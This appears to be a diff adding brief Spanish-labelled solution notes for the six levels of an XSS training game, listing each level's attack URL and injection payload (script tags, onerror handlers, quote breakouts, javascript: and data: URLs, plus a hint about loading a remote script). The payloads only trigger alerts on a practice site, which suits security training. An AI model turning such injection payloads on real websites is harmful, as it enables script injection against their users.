@@ -1,0 +1,23 @@
+Nivel 1: Hello, world of XSS  
+Query:https://xss-game.appspot.com/level1/frame?query=<script>alert(1)</script>
+Vector:<script>alert(1)</script>
+Nivel 2: Persistence is key       
+Query:https://xss-game.appspot.com/level2/frame
+post-content=<img src='foobar' onerror='alert("xss")'>
+Vector:
+<img src='foobar' onerror='alert("xss")'>
+"><img src=x onerror=alert(1)>
+
+Nivel 3: That sinking feeling..   
+Query:https://xss-game.appspot.com/level3/frame#'/><script>alert(1)</script>
+Vector:'/><script>alert(1)</script>
+Nivel 4: Context matters 
+Query:https://xss-game.appspot.com/level4/frame?timer=1')%3Balert('1
+Vector:1')%3Balert('1
+Nivel 5: Breaking protocol 
+Query:https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)
+Vector:javascript:alert(1)
+Nivel 6: Follow the whiterabbit(X)
+Query:https://xss-game.appspot.com/level6/frame#data:text/plain,alert('xss')
+Vector:data:text/plain,alert('xss')
+también se puede  HTTPS://cualquiersitiodondeesteelcontenidodelxss.js 
